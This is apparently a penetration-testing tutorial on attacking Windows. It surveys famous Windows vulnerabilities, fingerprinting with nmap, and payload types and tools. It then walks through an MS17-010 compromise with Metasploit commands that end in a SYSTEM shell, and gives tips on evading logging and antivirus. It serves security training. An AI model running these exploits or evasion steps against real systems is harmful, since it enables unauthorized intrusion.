
# Infiltrating Windows

Microsoft Windows dominates both **enterprise** and **home** environments. With the evolution of **Active Directory**, **cloud integration**, **PowerShell**, **WSL**, and enterprise services, the Windows attack surface has expanded significantly.

In the last few years alone, **thousands of vulnerabilities** have been reported across Microsoft products. Many of these vulnerabilities have resulted in **wormable**, **unauthenticated**, or **privilege-escalation** attacks that remain relevant today.

Understanding **how to identify, exploit, and operate inside Windows systems** is a core skill for any penetration tester.

---

## Prominent Windows Vulnerabilities (High-Impact)

These vulnerabilities shaped modern Windows exploitation and still appear in labs and real environments:

### MS08-067

* SMB vulnerability affecting multiple Windows versions
* Used by **Conficker** and **Stuxnet**
* Allowed unauthenticated remote code execution
* One of the earliest wormable Windows exploits

### EternalBlue (MS17-010)

* SMBv1 vulnerability leaked from the NSA
* Used in **WannaCry** and **NotPetya**
* Still commonly exploitable in unpatched environments
* Enables kernel-level code execution

### PrintNightmare

* Windows Print Spooler RCE
* Allows privilege escalation to SYSTEM
* Requires valid credentials or low-privilege shell
* Widely abused during 2021

### BlueKeep (CVE-2019-0708)

* RDP pre-authentication RCE
* Affects Windows 2000 through Server 2008 R2
* Wormable and extremely dangerous

### SigRed (CVE-2020-1350)

* DNS Server memory corruption
* Can lead to **Domain Admin** compromise
* Targets domain controllers

### SeriousSAM (CVE-2021-36934)

* Incorrect permissions on SAM database backups
* Allows credential dumping via Volume Shadow Copies

### Zerologon (CVE-2020-1472)

* Netlogon cryptographic flaw
* Allows domain takeover in seconds
* Requires minimal guessing

---

## Fingerprinting Windows Hosts

Before exploitation, you must **identify the OS accurately**.

### TTL Analysis (ICMP)

* Windows hosts typically respond with:

  * TTL ≈ **128**
* Linux hosts typically respond with:

  * TTL ≈ **64**

Example:

```bash
ping 192.168.86.39
```

TTL values are not definitive alone, but they are **strong indicators**.

---

### OS Detection with Nmap

```bash
sudo nmap -O -v 192.168.86.39
```

Key indicators:

* `OS CPE: cpe:/o:microsoft:windows_10`
* `OS details: Microsoft Windows 10 1709 - 1909`
* Open ports: `135`, `139`, `445`

Nmap determines OS based on **TCP/IP stack fingerprinting**.

Use `-A` and `-Pn` if detection is unreliable.

---

### Banner Grabbing

```bash
sudo nmap --script banner.nse 192.168.86.39
```

Banner grabbing helps:

* Identify services
* Discover third-party software (VMware, IIS, etc.)
* Locate exploitable components

---

## Windows Payload File Types

Different payload formats are useful in different scenarios.

### DLL (Dynamic Link Library)

* Can be injected or hijacked
* Common for privilege escalation
* Useful for UAC bypass and SYSTEM execution

### BAT (Batch Files)

* Simple automation
* Executes native Windows commands
* Low detection footprint

### VBS (VBScript)

* Often used in phishing
* Executes via Windows Script Host
* Still effective with user interaction

### MSI (Windows Installer)

* Executes via `msiexec`
* Can run with elevated privileges
* Useful for stealthy execution

### PowerShell Scripts

* Native to modern Windows
* Deep system access via .NET
* Frequently targeted by AV and AMSI

---

## Payload Generation Tools

### MSFVenom / Metasploit

* OS-agnostic payload generation
* Automated exploitation
* Post-exploitation modules

### Nishang

* Offensive PowerShell framework
* Includes reverse shells, persistence, bypasses

### Mythic C2

* Advanced command-and-control framework
* Modern alternative to Metasploit

### Impacket

* Direct interaction with Windows protocols
* SMB, WMI, Kerberos, PsExec
* Essential for Windows environments

---

## Example Windows Compromise Workflow

### 1. Enumerate the Host

```bash
nmap -A -v 10.129.201.97
```

Findings:

* Windows Server 2016
* SMB exposed (445)
* Message signing disabled
* IIS running

---

### 2. Identify Exploit Path

SMB version and OS range suggest **MS17-010** may apply.

Verify with Metasploit:

```bash
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.129.201.97
run
```

Result:

```
Host is likely VULNERABLE to MS17-010
```

---

### 3. Exploit and Deliver Payload

```bash
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 10.129.201.97
set LHOST 10.10.14.12
exploit
```

Result:

* SYSTEM-level Meterpreter session
* Full control of the host

---

### 4. Drop to Native Shell

```bash
meterpreter > shell
```

Prompt:

```
C:\Windows\system32>
```

This confirms **cmd.exe**.

---

## CMD vs PowerShell

### Use CMD When:

* Older systems (XP, 2003)
* Minimal footprint needed
* Avoiding PowerShell logging
* Running basic commands

### Use PowerShell When:

* Using advanced scripts or cmdlets
* Interacting with .NET objects
* Working with cloud services
* Performing complex automation

Key difference:

* CMD is **text-based**
* PowerShell is **object-based**
* PowerShell logs extensively

---

## WSL and PowerShell Core Risks

### Windows Subsystem for Linux (WSL)

* Runs Linux binaries on Windows
* Network traffic may bypass Windows Firewall
* AV and EDR visibility is limited

### PowerShell Core

* Runs cross-platform
* Shares capabilities across Windows and Linux
* Emerging blind spot for detection systems

These features are increasingly abused by modern attackers.

---

## Key Takeaways

* Windows exploitation remains highly relevant
* Enumeration determines success
* SMB is a high-value attack surface
* MS17-010 is still common in labs and environments
* Payload format matters
* CMD and PowerShell each have tradeoffs
* WSL introduces new attack vectors

---
